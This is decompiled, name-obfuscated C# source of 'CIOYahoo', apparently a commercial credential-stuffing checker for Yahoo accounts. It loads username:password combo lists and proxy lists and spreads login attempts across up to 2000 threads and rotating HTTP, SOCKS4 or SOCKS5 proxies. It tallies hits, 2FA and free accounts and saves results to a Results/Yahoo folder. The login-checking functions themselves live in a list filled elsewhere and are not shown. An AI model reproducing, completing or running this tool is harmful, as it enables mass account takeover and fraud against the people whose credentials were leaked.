using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Colorful;

// Token: 0x0200000C RID: 12
internal class Class6
{
	// Token: 0x0600002A RID: 42 RVA: 0x00003334 File Offset: 0x00001534
	public static void smethod_0()
	{
		for (;;)
		{
			Class5.smethod_0();
			Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
			Class5.smethod_1("Enter a Thread amount : ", ColorTranslator.FromHtml(Class5.string_2), 25);
			try
			{
				Class6.int_0 = int.Parse(Colorful.Console.ReadLine());
				if (0 >= Class6.int_0)
				{
					Colorful.Console.WriteLine();
					Colorful.Console.WriteLine();
					Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
					Class5.smethod_1("Error, Try again.", ColorTranslator.FromHtml(Class5.string_2), 25);
					Thread.Sleep(2500);
					Class6.smethod_0();
				}
				else
				{
					if (Class6.int_0 <= 2000)
					{
						break;
					}
					Colorful.Console.WriteLine();
					Colorful.Console.WriteLine();
					Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
					Class5.smethod_1("Error, Try again.", ColorTranslator.FromHtml(Class5.string_2), 25);
					Thread.Sleep(2500);
					Class6.smethod_0();
				}
			}
			catch
			{
				Colorful.Console.WriteLine();
				Colorful.Console.WriteLine();
				Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
				Class5.smethod_1("Error, Try again.", ColorTranslator.FromHtml(Class5.string_2), 25);
				Thread.Sleep(2500);
			}
		}
		for (;;)
		{
			Class5.smethod_0();
			Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
			Class5.smethod_1("Select a Proxy type.", ColorTranslator.FromHtml(Class5.string_2), 25);
			Colorful.Console.WriteLine();
			Colorful.Console.WriteLine();
			Colorful.Console.WriteLineFormatted(" {0} HTTP", ColorTranslator.FromHtml(Class5.string_3), ColorTranslator.FromHtml(Class5.string_2), new object[]
			{
				"[1]"
			});
			Colorful.Console.WriteLineFormatted(" {0} SOCKS4", ColorTranslator.FromHtml(Class5.string_3), ColorTranslator.FromHtml(Class5.string_2), new object[]
			{
				"[2]"
			});
			Colorful.Console.WriteLineFormatted(" {0} SOCKS5", ColorTranslator.FromHtml(Class5.string_3), ColorTranslator.FromHtml(Class5.string_2), new object[]
			{
				"[3]"
			});
			ConsoleKey key = Colorful.Console.ReadKey(true).Key;
			ConsoleKey consoleKey = key;
			switch (consoleKey)
			{
			case ConsoleKey.D1:
				goto IL_241;
			case ConsoleKey.D2:
				goto IL_28B;
			case ConsoleKey.D3:
				goto IL_2D2;
			default:
				switch (consoleKey)
				{
				case ConsoleKey.NumPad1:
					goto IL_241;
				case ConsoleKey.NumPad2:
					goto IL_28B;
				case ConsoleKey.NumPad3:
					goto IL_2D2;
				}
				break;
			}
		}
		IL_241:
		Class6.string_1 = "HTTP";
		Colorful.Console.WriteLine();
		Colorful.Console.WriteLine();
		Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("HTTP Selected.", ColorTranslator.FromHtml(Class5.string_2), 25);
		Colorful.Console.WriteLine();
		goto IL_317;
		IL_28B:
		Class6.string_1 = "SOCKS4";
		Colorful.Console.WriteLine();
		Colorful.Console.WriteLine();
		Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("SOCKS4 Selected.", ColorTranslator.FromHtml(Class5.string_2), 25);
		Colorful.Console.WriteLine();
		goto IL_317;
		IL_2D2:
		Class6.string_1 = "SOCKS5";
		Colorful.Console.WriteLine();
		Colorful.Console.WriteLine();
		Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("SOCKS5 Selected.", ColorTranslator.FromHtml(Class5.string_2), 25);
		Colorful.Console.WriteLine();
		IL_317:
		Thread.Sleep(1500);
		Class5.smethod_0();
		Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("Select your Combos.", ColorTranslator.FromHtml(Class5.string_2), 25);
		OpenFileDialog openFileDialog = new OpenFileDialog();
		string fileName;
		do
		{
			openFileDialog.Title = "Load Combos";
			openFileDialog.DefaultExt = "txt";
			openFileDialog.Filter = "Text Files|*.txt";
			openFileDialog.RestoreDirectory = true;
			openFileDialog.ShowDialog();
			fileName = openFileDialog.FileName;
		}
		while (!File.Exists(fileName));
		try
		{
			Class6.ienumerable_0 = File.ReadAllLines(fileName);
		}
		catch
		{
			Colorful.Console.WriteLine();
			Colorful.Console.WriteLine();
			Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
			Class5.smethod_1("Error, While Loading Combos.", ColorTranslator.FromHtml(Class5.string_2), 25);
			Thread.Sleep(2500);
		}
		Class6.int_9 = Class6.ienumerable_0.Count<string>();
		Colorful.Console.WriteLine();
		Colorful.Console.WriteLine();
		Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("Loaded [", ColorTranslator.FromHtml(Class5.string_2), 25);
		Class5.smethod_1(Class6.int_9.ToString() ?? "", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("] Combos.", ColorTranslator.FromHtml(Class5.string_2), 25);
		Colorful.Console.WriteLine();
		Colorful.Console.WriteLine();
		Thread.Sleep(1500);
		Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("Select your Proxies.", ColorTranslator.FromHtml(Class5.string_2), 25);
		OpenFileDialog openFileDialog2 = new OpenFileDialog();
		string fileName2;
		do
		{
			openFileDialog2.Title = "Load Proxies";
			openFileDialog2.DefaultExt = "txt";
			openFileDialog2.Filter = "Text Files|*.txt";
			openFileDialog2.RestoreDirectory = true;
			openFileDialog2.ShowDialog();
			fileName2 = openFileDialog2.FileName;
		}
		while (!File.Exists(fileName2));
		try
		{
			Class6.ienumerable_1 = File.ReadAllLines(fileName2);
		}
		catch
		{
			Colorful.Console.WriteLine();
			Colorful.Console.WriteLine();
			Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
			Class5.smethod_1("Error, While Loading Combos.", ColorTranslator.FromHtml(Class5.string_2), 25);
			Thread.Sleep(2500);
		}
		Class6.string_4 = DateTime.Now.ToString("M.d.yyyy h-m tt");
		Directory.CreateDirectory("Results/Yahoo/" + Class6.string_4);
		Class6.int_10 = Class6.ienumerable_1.Count<string>();
		Colorful.Console.WriteLine();
		Colorful.Console.WriteLine();
		Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("Loaded [", ColorTranslator.FromHtml(Class5.string_2), 25);
		Class5.smethod_1(Class6.int_10.ToString() ?? "", ColorTranslator.FromHtml(Class5.string_3), 25);
		Class5.smethod_1("] Proxies.", ColorTranslator.FromHtml(Class5.string_2), 25);
		if (!(Class6.string_2 == "2"))
		{
		}
		Thread.Sleep(100);
		for (int i = 1; i <= Class6.int_0; i++)
		{
			new Thread(delegate()
			{
				Random random = new Random();
				while (Class6.int_11 < Class6.ienumerable_0.Count<string>())
				{
					int index = Class6.int_11;
					Interlocked.Increment(ref index);
					string[] arg = Class6.ienumerable_0.ElementAt(index).Split(new char[]
					{
						':'
					});
					string arg2 = Class6.ienumerable_1.ElementAt(random.Next(Class6.int_10));
					foreach (Func<string[], string, bool> func in Class6.list_0.Distinct<Func<string[], string, bool>>())
					{
						if (!func(arg, arg2))
						{
						}
					}
					Class6.int_6++;
				}
			}).Start();
		}
		if (Class6.string_2 == "1")
		{
			Class6.smethod_1();
		}
		else if (Class6.string_2 == "2")
		{
			Class6.smethod_2();
		}
	}

	// Token: 0x0600002B RID: 43 RVA: 0x000039E4 File Offset: 0x00001BE4
	public static void smethod_1()
	{
		int num = Class6.int_6;
		for (;;)
		{
			Class6.int_5 = Class6.int_6 - num;
			num = Class6.int_6;
			Colorful.Console.Clear();
			Class5.smethod_0();
			Colorful.Console.Title = string.Concat(new string[]
			{
				"CIOYahoo ~ SexyAzure#4503 | Hits - ",
				Class6.int_2.ToString(),
				" | Frees - ",
				Class6.int_3.ToString(),
				" | Bads - ",
				(Class6.int_6 - Class6.int_2 - Class6.int_3).ToString(),
				" | Remaining - ",
				(Class6.int_9 - Class6.int_6).ToString(),
				" | Errors - ",
				Class6.int_4.ToString(),
				" | Cpm - ",
				(Class6.int_5 * 60).ToString()
			});
			Colorful.Console.WriteLine();
			Colorful.Console.WriteLine();
			Colorful.Console.WriteLineFormatted(" [{0}] Hits ~ {1}", Color.Green, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_2)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] 2FA ~ {1}", Color.Aquamarine, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_7)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] Frees ~ {1}", Color.Yellow, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_3)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] Bad ~ {1}", Color.Red, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_6 - Class6.int_2 - Class6.int_3 - Class6.int_7)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] Checked ~ {1}", ColorTranslator.FromHtml(Class5.string_3), Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_6)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] Remaining ~ {1}", ColorTranslator.FromHtml(Class5.string_3), Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_9 - Class6.int_6)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] Threads ~ {1}", Color.Goldenrod, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_0)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] Errors ~ {1}", Color.Indigo, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_4)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] Retries ~ {1}", Color.Lime, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_8)
			});
			Colorful.Console.WriteLineFormatted(" [{0}] CPM ~ {1}", Color.Aquamarine, Color.White, new object[]
			{
				">",
				string.Format("{0}", Class6.int_5 * 60)
			});
			Thread.Sleep(Class2.class3_0.Int32_0);
			if (Class6.int_6 >= Class6.int_9)
			{
				Colorful.Console.Title = "CIOYahoo ~ SexyAzure#4503 | Hits ~ " + Class6.int_2.ToString() + " | Leave A Good Review ;)";
				Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
				Class5.smethod_1("Finished Checking.", ColorTranslator.FromHtml(Class5.string_2), 25);
				Colorful.Console.WriteLine();
				Colorful.Console.WriteLine();
				Colorful.Console.WriteFormatted(" {0} Press any key to return to Main Functions.", ColorTranslator.FromHtml(Class5.string_3), ColorTranslator.FromHtml(Class5.string_2), new object[]
				{
					"[-]"
				});
				Colorful.Console.ReadLine();
				Class4.smethod_0();
			}
		}
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00003DE0 File Offset: 0x00001FE0
	public static void smethod_2()
	{
		int num = Class6.int_6;
		for (;;)
		{
			Class6.int_5 = num - num;
			num = Class6.int_6;
			Colorful.Console.Title = string.Concat(new string[]
			{
				"CIOYahoo ~ SexyAzure#4503 | Hits - ",
				Class6.int_2.ToString(),
				" | Frees - ",
				Class6.int_3.ToString(),
				" | Bads - ",
				(Class6.int_6 - Class6.int_2 - Class6.int_3).ToString(),
				" | Remaining - ",
				(Class6.int_9 - Class6.int_6).ToString(),
				" | Errors - ",
				Class6.int_4.ToString(),
				" | Cpm - ",
				(Class6.int_5 * 60).ToString()
			});
			Thread.Sleep(1000);
			if (num >= Class6.int_9)
			{
				Colorful.Console.Title = "CIOYahoo ~ SexyAzure#4503 | Hits ~ " + Class6.int_2.ToString() + " | Leave A Good Review ;)";
				Class5.smethod_1(" [-] ", ColorTranslator.FromHtml(Class5.string_3), 25);
				Class5.smethod_1("Finished Checking.", ColorTranslator.FromHtml(Class5.string_2), 25);
				Colorful.Console.WriteLine();
				Colorful.Console.WriteLine();
				Colorful.Console.WriteFormatted(" {0} Press any key to return to Main Functions.", ColorTranslator.FromHtml(Class5.string_3), ColorTranslator.FromHtml(Class5.string_2), new object[]
				{
					"[-]"
				});
				Colorful.Console.ReadLine();
				Class4.smethod_0();
			}
		}
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00003F5C File Offset: 0x0000215C
	public static string smethod_3()
	{
		return string.Concat(new string[]
		{
			Class6.smethod_4(8),
			"-",
			Class6.smethod_4(4),
			"-4",
			Class6.smethod_4(3),
			"-",
			Class6.smethod_4(4),
			"-",
			Class6.smethod_4(12)
		});
	}

	// Token: 0x0600002E RID: 46 RVA: 0x0000210B File Offset: 0x0000030B
	public static string smethod_4(int int_12)
	{
		return new string((from s in Enumerable.Repeat<string>("abcdefhijklmnopqrstuvwxyz0123456789", int_12)
		select s[Class6.random_0.Next(s.Length)]).ToArray<char>());
	}

	// Token: 0x0600002F RID: 47 RVA: 0x00002146 File Offset: 0x00000346
	public static string smethod_5(int int_12)
	{
		return new string((from s in Enumerable.Repeat<string>("0123456789", int_12)
		select s[Class6.random_0.Next(s.Length)]).ToArray<char>());
	}

	// Token: 0x06000030 RID: 48 RVA: 0x00002181 File Offset: 0x00000381
	public static string smethod_6(int int_12)
	{
		return new string((from s in Enumerable.Repeat<string>("abcdefhijklmnopqrstuvwxyz", int_12)
		select s[Class6.random_0.Next(s.Length)]).ToArray<char>());
	}

	// Token: 0x06000031 RID: 49 RVA: 0x000021BC File Offset: 0x000003BC
	public static string smethod_7(string string_5)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(string_5));
	}

	// Token: 0x06000032 RID: 50 RVA: 0x000021CE File Offset: 0x000003CE
	public static string smethod_8(string string_5, string string_6, string string_7)
	{
		return string_5.Split(new string[]
		{
			string_6
		}, StringSplitOptions.None)[1].Split(new string[]
		{
			string_7
		}, StringSplitOptions.None)[0];
	}

	// Token: 0x0400001B RID: 27
	public static List<Func<string[], string, bool>> list_0 = new List<Func<string[], string, bool>>();

	// Token: 0x0400001C RID: 28
	public static string string_0 = "";

	// Token: 0x0400001D RID: 29
	public static int int_0 = -1;

	// Token: 0x0400001E RID: 30
	public static int int_1 = -1;

	// Token: 0x0400001F RID: 31
	public static string string_1 = "";

	// Token: 0x04000020 RID: 32
	public static int int_2 = 0;

	// Token: 0x04000021 RID: 33
	public static int int_3 = 0;

	// Token: 0x04000022 RID: 34
	public static int int_4 = 0;

	// Token: 0x04000023 RID: 35
	public static int int_5 = 0;

	// Token: 0x04000024 RID: 36
	public static int int_6 = 0;

	// Token: 0x04000025 RID: 37
	public static int int_7 = 0;

	// Token: 0x04000026 RID: 38
	public static int int_8 = 0;

	// Token: 0x04000027 RID: 39
	public static IEnumerable<string> ienumerable_0;

	// Token: 0x04000028 RID: 40
	public static int int_9 = 0;

	// Token: 0x04000029 RID: 41
	public static IEnumerable<string> ienumerable_1;

	// Token: 0x0400002A RID: 42
	public static int int_10 = 0;

	// Token: 0x0400002B RID: 43
	public static int int_11 = 0;

	// Token: 0x0400002C RID: 44
	public static string string_2 = "";

	// Token: 0x0400002D RID: 45
	public static string string_3 = "";

	// Token: 0x0400002E RID: 46
	public static string string_4;

	// Token: 0x0400002F RID: 47
	private static Random random_0 = new Random();
}
